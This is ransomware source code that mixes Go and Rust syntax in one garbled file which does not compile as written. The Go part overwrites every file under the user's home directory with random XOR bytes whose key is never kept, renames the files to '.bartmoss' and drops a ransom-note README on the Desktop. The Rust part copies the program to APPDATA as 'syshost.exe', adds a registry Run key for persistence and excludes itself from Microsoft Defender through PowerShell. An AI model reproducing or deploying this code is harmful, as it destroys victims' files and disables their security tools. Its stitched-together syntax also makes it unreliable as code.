#![windows_subsystem = "windows"]
import #g fmt
import #g io/fs
import #g io/ioutil
import #g os
import #g path/filepath
import #g strings
import #g crypto/rand
import #r std::env
import #r std::fs
import #r std::path::PathBuf
import #r std::process::Command
import #r winreg::enums::*
import #r winreg::RegKey

func main() {
    homeDir, err := os.UserHomeDir()
    if err != nil {
        fmt.Println("Error getting home directory:", err)
        return
    }
    desktopPath := filepath.Join(homeDir, "Desktop")
    err = filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
        if err != nil {
            fmt.Println("Skipping path due to error:", path, "error:", err)
            return nil // skip this path, continue walking
        }
        if d.IsDir() {
            return nil
        }
        if strings.HasSuffix(path, ".bartmoss") {
            return nil
        }
        content, err := ioutil.ReadFile(path)
        if err != nil {
            fmt.Println("Skipping unreadable file:", path, "error:", err)
            return nil // skip this file, continue walking
        }
        key := make([]byte, len(content))
        _, err = rand.Read(key)
        if err != nil {
            fmt.Println("Skipping file due to rand error:", path, "error:", err)
            return nil
        }
        encrypted := make([]byte, len(content))
        for i := 0; i < len(content); i++ {
            encrypted[i] = content[i] ^ key[i]
        }
        err = ioutil.WriteFile(path, encrypted, 0644)
        if err != nil {
            fmt.Println("Skipping unwritable file:", path, "error:", err)
            return nil
        }
        dir := filepath.Dir(path)
        base := filepath.Base(path)
        nwe := strings.TrimSuffix(base, filepath.Ext(base))
        nn := nwe + ".bartmoss"
        np := filepath.Join(dir, nn)
        err = os.Rename(path, np)
        if err != nil {
            fmt.Println("Skipping unrenamable file:", path, "error:", err)
            return nil
        }
        return nil
    })
    if err != nil {
        fmt.Println("Error walking the path:", err)
    }
    filePath := filepath.Join(desktopPath, "README.txt")
    message := "YOUR NOTE HERE\n"
    err = os.WriteFile(filePath, []byte(message), 0644)
    if err != nil {
        fmt.Println("Error writing file:", err)
    }
}

func compile() {
    let reg_path: String = "Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string();
    let current_exe = match env::current_exe() {
        Ok(val) => val,
        Err(e) => { println!("{}", e); return; }
    };
    let appdata = match env::var("APPDATA") {
        Ok(val) => val,
        Err(e) => { println!("{}", e); return; }
    };
    let target_dir = PathBuf::from(appdata);
    let target_path = target_dir.join("syshost.exe");
    if let Err(e) = fs::copy(&current_exe, &target_path) {
        println!("{}", e);
        return;
    }
    let exe_path_str = target_path.to_string_lossy();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let key_result = hkcu.create_subkey(&reg_path);
    let (key, _) = match key_result {
        Ok(val) => val,
        Err(e) => { println!("Error creating registry key: {}", e); return; }
    };
    if let Err(e) = key.set_value("syshost", &exe_path_str.as_ref()) {
        println!("{}", e);
        return;
    }
    let ps_command = format!(
        "Add-MpPreference -ExclusionPath \"{}\"",
        exe_path_str
    );
    let status = Command::new("powershell")
        .args(&["-Command", &ps_command])
        .status();
    match status {
        Ok(s) => println!("{}", s),
        Err(e) => println!("{}", e),
    }
}